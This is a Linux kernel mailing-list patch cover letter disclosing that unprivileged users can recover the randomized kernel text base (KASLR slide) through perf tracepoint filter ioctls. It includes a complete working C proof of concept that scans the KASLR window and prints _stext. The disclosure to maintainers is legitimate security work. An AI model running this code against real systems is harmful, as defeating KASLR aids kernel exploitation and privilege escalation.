Received: from mail-dl2-f42.google.com (mail-dl2-f42.google.com [74.125.229.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 262DB2459E1
	for <linux-perf-users@vger.kernel.org>; Mon, 28 Sep 2026 00:00:50 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790553653; cv=none; b=ljftAZKIIvmDNsTommDbZuJfozhlgSbH1SjXQEw655xGPyz8Qn60n3FoNTgtsfTUe0eIw/9SveKa4U8VZ0SpFcZBSlnsOkz5VrNTu+gsFuq4cAGB4So3F8gdbzRXMHEPw6sY7or5HNQiHl8kf6N+/YhAlREF4zqvOV6MM7SKcSw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790553653; c=relaxed/simple;
	bh=xAV81QeqR4ZtpFqOVKF9+IHtT4wTiC4bAZ5jEUD3yEo=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=KrgZ8QhJVFok9KKFZ+72k4uZcaHzFc7BrNSFLod5B0c3an7wpNW3kETHhE6WwcV6CKXAZq6uWMb877sTmZuMsoZprwrBmm976KYt+8gw5lzpNv8yNhzBifEJcw6usb3Od2gIrzxR2Nu2zanI2c3LEphisuyIsxIA9/YDcqDyL54=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=rBT9DDkT; arc=none smtp.client-ip=74.125.229.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="rBT9DDkT"
Received: by mail-dl2-f42.google.com with SMTP id a92af1059eb24-144ecebb6cbso718182c88.3
        for <linux-perf-users@vger.kernel.org>; Sun, 27 Sep 2026 17:00:50 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790553649; x=1791158449; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
        b=rBT9DDkTXPWbjkWwrBHqlqaEKQ/ZD8ADHrbJ7+ys2B1XLtdVYmXbuzK3XUVEqu7O0N
         F+5PBYuzHUqv7HHitPBC+xPjVhaSCv04lWbCn8RS4x3pf6EWjDVWIMu75O6C8BjBqPOE
         7TXOQvLLy238pw3S8sNuePOAzrONfGgy+OzTHg8QZ03VuWa4dDUk0/BOBhA63K+RzocM
         Yr/0woGNn8GBQzhk0z8zRXcpI05CCkbhQHAjToWg9cga1oN6JSO1OFS9umxVKg+iQ1Yr
         N1vjCxg5Xmk/6AU5Vx/sHMpaRfoOhbDXIvvlu17yDPSoAjBkvUGJW4GN9K0UsNrpFeZa
         b/JQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790553649; x=1791158449;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
        b=2LBMcl1/1UENrSyg78aJiQttdiBzUQjwsk5W8CHQZQn+MewlG3URbCX0wwJLm6rhT9
         yu6jZHk6zU70iWcKTvkjDd3iXJE0m/rAKH0eLy42CWbq+MAlQp79oDZmzon/UCAc6otd
         7MZGJl2G31WrVNhd0fpi51ovo92eoQZvSJYEFJz6pc9mFWvAsSlnT0igEt3wfgpF+wZ5
         jJjbot/TDG1cb6v8QMTDktFXyfAP5GBMhet2R8hqAzcRsGyBKFVXHwmp/j9eiLx31Mde
         TxRXR62kLDn9fhMfSCCFTkRKjFCbGzjmB/vR+g8Ziy/OhBqR7EiXU5zQUILuuZ2I+CmT
         Lrug==
X-Forwarded-Encrypted: i=1; AKwUvBxsqfD2BiY5a4Cdbo7v9ulgkVzdh3GXDAjAI9TpkmedqQbqQBgpjZI9KuxGUooWZP0TdJUGTznd7zFjNjGXVicP@vger.kernel.org
X-Gm-Message-State: AFuF++kp9OI1gfYEUhHAPOCsSTNv9pDN7pLz5S1eszRD7F+nw2yYjEPA
	s8+aftEpNfFI3uMwPEQ81DF39NW6hEmNBzo6hEBnlbOVZ2rBM2cFQBtc
X-Gm-Gg: AYBFou1hHgEA0Am3DuqnlR6TU//lwGtxzN+TC8juQ6vlGCpHqCeFn/yO+UVQWbr30pq
	sNj39Vc6CrU5GyuhmMx6Ot0tdp0WGq4TYPhrf76luMNw3EPihHocSA9KCyFIonoA01scc+USGoL
	kky79jqwC98j9Y2heG/OM8LjDi/yOijZ5S9UZOtxdJsGEOLOs4zbIRAz8IerK6TNPbfEO5UGLtY
	sqvoC3iIQq+Fm3i/DGjR2Va1nDp8Qh7OvcVwksX1CzPyqbudBrVva4lZnIdjriw0zhC4pe2VocX
	Nmyhzn4SkbCdI1WGpV+utLJVzpw0nV6E2LkH2jH048LfIBL9RZaNZ5lPJsgtW6WF18XfkjA4L10
	OmwlYOHzGuy+KbnAxkLSCtlCYOAKn5R+3mQxfk8ltSRzmPs1IuDeLMm5B2MM+TTH4nMbnZX5he9
	Q66myf7bDDz2RtD83eDxYt80AGAJap3VEIhyQf4gK6nIg2mU8ftvQDhG2tW1pkJHLllbzP7RxoJ
	ReQv5F8
X-Received: by 2002:a05:7022:f84:b0:13f:ad08:4497 with SMTP id a92af1059eb24-146ce1a80ffmr12159470c88.4.1790553647655;
        Sun, 27 Sep 2026 17:00:47 -0700 (PDT)
Received: from kq.cs.ucr.edu (kq.cs.ucr.edu. [169.235.27.223])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-145acc47ab8sm23752109c88.6.2026.09.27.17.00.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 27 Sep 2026 17:00:42 -0700 (PDT)
From: Zhengchuan Liang <zcliangcn@gmail.com>
To: Steven Rostedt <rostedt@goodmis.org>
Cc: Masami Hiramatsu <mhiramat@kernel.org>,
	Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
	Ross Zwisler <zwisler@google.com>,
	linux-trace-kernel@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Peter Zijlstra <peterz@infradead.org>,
	linux-perf-users@vger.kernel.org,
	stable@vger.kernel.org,
	Zhengchuan Liang <zcliangcn@gmail.com>
Subject: [PATCH 0/1] perf tracepoint filter exposes the kernel text base
Date: Sun, 27 Sep 2026 17:00:30 -0700
Message-Id: <cover.1790553331.git.zcliangcn@gmail.com>
X-Mailer: git-send-email 2.25.1
Precedence: bulk
X-Mailing-List: linux-perf-users@vger.kernel.org
List-Id: <linux-perf-users.vger.kernel.org>
List-Subscribe: <mailto:linux-perf-users+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-perf-users+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi,

I found and validated an information leak in
kernel/trace/trace_events_filter.c. An unprivileged user can recover the
randomized kernel text base, revealing the kernel's KASLR slide, by
observing PERF_EVENT_IOC_SET_FILTER return values for a disabled,
count-only perf tracepoint event.

Such an event can be opened with exclude_kernel=1 and sample_type=0. The
ioctl nevertheless accepts .function predicates. A numeric operand is
passed to kallsyms_lookup_size_offset(), so success distinguishes an
address in the kernel image from one outside it. A symbolic operand
likewise resolves a kernel symbol internally and can compare its address
with a task-controlled tracepoint field.

Here is a minimized numeric PoC for an x86_64 kernel built with
CONFIG_KALLSYMS_ALL=y. The scan uses 2 MiB steps, the minimum permitted
value of CONFIG_PHYSICAL_ALIGN on x86_64, and covers the 1 GiB virtual
KASLR window. Event ID 5 identifies the built-in TRACE_PRINT event.
The upstream default is perf_event_paranoid=2. Some distributions retain
that setting, while others use a stricter value. With the default
setting, run the PoC as an unprivileged user:

  #define _GNU_SOURCE
  #include <linux/perf_event.h>
  #include <stdio.h>
  #include <sys/ioctl.h>
  #include <sys/syscall.h>
  #include <unistd.h>

  int main(void)
  {
          struct perf_event_attr a = {
                  .type = PERF_TYPE_TRACEPOINT, .size = sizeof(a),
                  .config = 5, .disabled = 1, .exclude_kernel = 1,
          };
          int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
          char filter[64];

          if (fd < 0)
                  return 1;
          for (unsigned long long p = 0xffffffff80000000ULL;
               p < 0xffffffffc0000000ULL; p += 0x200000ULL) {
                  snprintf(filter, sizeof(filter),
                           "ip.function == 0x%llx", p);
                  if (!ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filter)) {
                          printf("_stext=0x%llx\n", p);
                          return 0;
                  }
          }
          return 2;
  }

I reproduced the leak under these conditions as an unprivileged user on
a kernel built from the current upstream tree. The reported _stext
matched the value in /proc/kallsyms as read by root. The PoC needs no
tracefs access or perf sample data.
